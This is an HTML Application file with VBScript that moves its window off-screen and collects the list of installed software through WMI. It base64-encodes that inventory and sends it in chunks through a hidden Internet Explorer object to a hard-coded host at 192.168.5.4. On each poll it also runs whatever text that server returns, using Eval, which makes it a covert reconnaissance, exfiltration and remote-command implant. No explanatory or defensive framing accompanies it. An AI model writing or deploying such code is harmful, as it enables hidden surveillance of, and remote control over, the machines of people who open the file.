<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>

<HTA:APPLICATION
  SHOWINTASKBAR="no"
  />
</head>

<script language="VBScript">
window.moveTo -2000,-2000

Function Stream_StringToBinary(Text)
 On Error Resume Next
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 2
 BinaryStream.CharSet = "us-ascii"
 BinaryStream.Open
 BinaryStream.WriteText Text
 BinaryStream.Position = 0
 BinaryStream.Type = 1
 BinaryStream.Position = 0
 Stream_StringToBinary = BinaryStream.Read
 Set BinaryStream = Nothing
End Function

Function Base64Encode(sText)
    On Error Resume Next
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    Base64Encode = Replace(oNode.text, Chr(10), "") 
End Function


Dim arrProgram, arrSoftware
Dim i
Dim colItems, objItem, objWMIService
Dim strCsv, strDateFilter, strKey, strNameFilter, strOutput, strSortDate, strVendorFilter, strValue
Set arrSoftware   = CreateObject( "System.Collections.Sortedlist" )

Set objWMIService = GetObject( "winmgmts://./root/cimv2" )
Set colItems = objWMIService.ExecQuery( "Select * from Win32_ComputerSystem" )
For Each objItem in colItems
	strComputer = objItem.Name
Next

Set objWMIService = GetObject( "winmgmts://" & strComputer & "/root/CIMV2" )
Set colItems = objWMIService.ExecQuery( "SELECT * FROM Win32_Product" )

For Each objItem In colItems
	If InStr( 1, objItem.Name, strFilter, vbTextCompare ) > 0 Then
		strKey   = objItem.Name & " " & objItem.Version
		strValue = objItem.Name & vbTab & objItem.Version & vbTab & objItem.Vendor & vbTab & objItem.InstallDate & vbTab & objItem.PackageCache & vbTab & objItem.IdentifyingNumber
		If arrSoftware.ContainsKey( strKey ) Then
			Do While arrSoftware.ContainsKey( strKey )
				strKey = strKey & " 0"
			Loop
		End If
		arrSoftware.Add strKey, strValue
	End If
Next

res = ""

For i = 0 To arrSoftware.Count - 1
	arrProgram = Split( arrSoftware.GetByIndex(i), vbTab )
	strOutput  = "Name          :  " & arrProgram(0) & vbCrLf _
						 & "Version       :  " & arrProgram(1) & vbCrLf _
						 & "Vendor        :  " & arrProgram(2) & vbCrLf _
						 & "Install Date  :  " & arrProgram(3) & vbCrLf _
						 & "Package Cache :  " & arrProgram(4) & vbCrLf _
						 & "ID            :  " & arrProgram(5) & vbCrLf & vbCrLf
	res = res & strOutput
	strCsv     = strComputer   & vbTab _
						 & arrProgram(0) & vbTab _
						 & arrProgram(1) & vbTab _
						 & arrProgram(2) & vbTab _
						 & arrProgram(3) & vbTab _
						 & arrProgram(4) & vbTab _
						 & arrProgram(5) & vbCrLf
	res = res & strCsv
	
Next

outBuffer = res

Set objIE = CreateObject("InternetExplorer.Application")
objIE.Visible = False
strikes = 0

Function daLoop()
    On Error Resume Next

    If objIE.Busy Then
        strikes = strikes + 1

        If strikes > 5 Then
            objIE.Stop()
            strikes = 0
        End If
    Else
        response = objIE.Document.Body.InnerText
				Eval(response)

        objIE.Stop()
        strikes = 0

        If Len(outBuffer) > 0 Then
            chunkSize = 400
            If Len(outBuffer) <= chunkSize Then
                chunk = outBuffer
                outBuffer = ""
            Else
                chunk = Left(outBuffer, chunkSize)
                outBuffer = Right(outBuffer, Len(outBuffer) - chunkSize)
            End If

            b = Base64Encode(chunk)
						Replace b, "+", "%2B"
						Replace b, "/", "%2F"
						Replace b, "=", "%3D"
						b = "?" & b
        Else
            b = ""
        End If

        objIE.Navigate2 "http://192.168.5.4/index.html" & b, 14
    End If

    a = window.setTimeout("daLoop", 1000, "VBScript")
End Function

daLoop()

</script>
</html>